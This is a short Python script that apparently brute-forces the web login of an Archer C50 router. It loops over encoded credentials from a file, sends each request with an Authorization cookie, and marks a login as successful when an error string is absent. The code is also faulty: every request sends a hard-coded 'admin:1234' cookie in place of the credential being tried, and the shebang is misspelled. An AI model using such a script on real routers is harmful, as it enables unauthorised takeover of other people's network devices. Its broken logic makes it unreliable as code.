# /bin/pyhton3
import requests

def Archerc50(URL_RANGE):
    with open('../encodedcreds.txt', 'r') as encoded_raw_data:
        for line in encoded_raw_data.readlines():
            cred = line.strip('\n')
            print("[+] Trying with "+cred)
            cook = {'Authorization': 'Basic YWRtaW46MTIzNAo='}
            requestToRouter = requests.get(URL_RANGE, cookies=cook)
            if 'Base64Encoding' in requestToRouter.text:
                print("Invalid")
            else:
                print("Success "+ cred)
